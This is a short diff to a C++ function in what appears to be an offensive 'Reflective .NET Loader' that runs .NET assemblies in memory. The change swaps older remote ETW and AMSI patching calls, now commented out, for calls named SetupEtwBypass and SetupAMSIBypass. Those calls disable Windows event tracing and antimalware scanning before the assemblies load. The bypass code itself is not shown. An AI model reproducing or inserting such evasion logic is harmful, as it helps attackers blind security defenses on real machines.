@@ -170,24 +170,28 @@ LPSTR* convertArgsToLPSTRArray(std::wstring args, int& argsCount) {
     }
     return arguments;
 }
-void Dotnet(std::wstring FilePath, std::wstring args){
+void Dotnet(std::wstring FilePath, std::wstring args) {
 
     int argsCount = 0;
     SAFEARRAY* params = nullptr;
-	LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
-    if (!patchRemoteETW(mainInjector.process(-1))) {
-        
-		std::cout << "[+] Patched ETW\n";
+    LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
+    SetupEtwBypass();
+    SetupAMSIBypass();
+    /*if (!patchRemoteETW(mainInjector.process(-1))) {
+
+        std::cout << "[+] Patched ETW\n";
     }
     else {
         std::cout << "[-] Didnt Patched ETW\n";
-    }
+    };
+    
     if (!patchRemoteAmsi(mainInjector.process(-1))) {
         std::cout << "[+] Patched Amsi\n";
     }
     else {
 		std::cout << "[-] Didnt Patched Amsi\n";
     }
+    */
     
     std::wcout << L"------- Reflective .NET Loader -------\n";
 
